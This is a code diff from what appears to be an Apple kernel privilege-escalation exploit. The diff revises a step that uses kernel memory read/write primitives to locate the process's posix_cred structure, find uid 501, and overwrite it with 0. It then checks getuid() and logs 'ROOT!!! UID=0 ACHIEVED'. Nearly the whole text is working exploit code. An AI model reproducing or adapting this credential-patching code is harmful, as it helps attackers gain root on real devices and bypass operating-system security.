@@ -753,41 +753,40 @@
         [r appendFormat:@"  refcount after  = 0x%016llx  %s\n", refAfter,
             (refAfter == ref0 + 0x10000) ? "INFLATED OK" : "FAILED"];
 
-        // 5. Find uid cluster in ucred_rw+0x10 (posix_cred)
+        // 5. Find uid cluster — rw10 is a POINTER to posix_cred, follow it
         uint64_t rw10 = early_kread64(ucredRw + 0x10);
-        [r appendFormat:@"  rw10 (posix_cred?) = 0x%016llx\n", rw10];
-        // Scan for 501 in rw10 area
+        [r appendFormat:@"  rw10 (posix_cred ptr) = 0x%016llx\n", rw10];
         int found501 = 0;
-        for (uint32_t o = 0; o < 0x80; o += 8) {
-            uint64_t q = early_kread64(ucredRw + 0x10 + o);
-            if ((uint32_t)q == 501 || (uint32_t)(q >> 32) == 501) {
-                [r appendFormat:@"  ★ 501-cluster at ucred_rw+0x%02x = 0x%016llx\n", 0x10 + o, q];
-                found501 = 1;
-                // Write uid=0 to the low half
-                uint64_t saved = q;
-                uint64_t newVal = q & 0xffffffff00000000ULL;  // zero low 32 bits (uid)
-                early_kwrite64(ucredRw + 0x10 + o, newVal);
-                uint64_t rb = early_kread64(ucredRw + 0x10 + o);
-                [r appendFormat:@"  wrote uid=0: 0x%016llx -> 0x%016llx (readback 0x%016llx)\n", saved, newVal, rb];
-                // Check getuid
-                uid_t u = getuid();
-                [r appendFormat:@"  getuid() = %d\n", u];
-                if (u == 0) {
-                    [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
-                    // Don't restore — we're root!
-                } else {
-                    [r appendString:@"  getuid unchanged — restoring\n"];
-                    early_kwrite64(ucredRw + 0x10 + o, saved);
+        // Scan the posix_cred object at rw10 for 501
+        if (rw10 > 0xfffffff000000000ULL) {
+            for (uint32_t o = 0; o < 0x80; o += 8) {
+                uint64_t q = early_kread64(rw10 + o);
+                if ((uint32_t)q == 501 || (uint32_t)(q >> 32) == 501) {
+                    [r appendFormat:@"  ★ 501-cluster at posix_cred+0x%02x = 0x%016llx\n", o, q];
+                    found501 = 1;
+                    uint64_t saved = q;
+                    uint64_t newVal = q & 0xffffffff00000000ULL;
+                    early_kwrite64(rw10 + o, newVal);
+                    uint64_t rb = early_kread64(rw10 + o);
+                    [r appendFormat:@"  wrote uid=0: 0x%016llx -> 0x%016llx (readback 0x%016llx)\n", saved, newVal, rb];
+                    uid_t u = getuid();
+                    [r appendFormat:@"  getuid() = %d\n", u];
+                    if (u == 0) {
+                        [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
+                    } else {
+                        [r appendString:@"  getuid unchanged — restoring\n"];
+                        early_kwrite64(rw10 + o, saved);
+                    }
+                    break;
                 }
-                break;
             }
         }
+        // Also scan ucred_rw itself (not just +0x10)
         if (!found501) {
-            [r appendString:@"  501-cluster not found in ucred_rw+0x10 area\n"];
-            // Try scanning more
-            for (uint32_t o = 0; o < 0x200; o += 8) {
+            [r appendString:@"  scanning ucred_rw directly...\n"];
+            for (uint32_t o = 0; o < 0x100; o += 8) {
                 uint64_t q = early_kread64(ucredRw + o);
-                if ((uint32_t)q == 501) {
+                if ((uint32_t)q == 501 || (uint32_t)(q >> 32) == 501) {
                     [r appendFormat:@"  ★ 501 at ucred_rw+0x%02x = 0x%016llx\n", o, q];
                 }
             }
